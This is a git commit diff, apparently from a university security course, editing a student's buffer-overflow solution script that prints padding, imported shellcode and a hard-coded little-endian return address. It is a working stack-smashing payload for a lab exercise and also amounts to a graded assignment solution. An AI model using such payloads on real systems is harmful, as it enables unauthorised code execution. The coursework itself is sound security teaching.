c73ae2929d893cd52dc228dbab100a1b619f12b0
Libby Cox <libbycox@umich.edu>
2025-04-01 19:29:17 +0000

    Automatic commit by test script for libbycox

--- sol3.py
+++ sol3.py
@@ -4,7 +4,7 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write(shellcode+b'A'*2002+(0x7ffffff6cd10).to_bytes(8,"little"))
+sys.stdout.buffer.write(b'A'*2002+shellcode+(0x7ffffff6cd10).to_bytes(8,"little"))
 
 # need to write into a tmp register and then access 
 # tmp: rbx, rdx, rcx, rdi, rsi
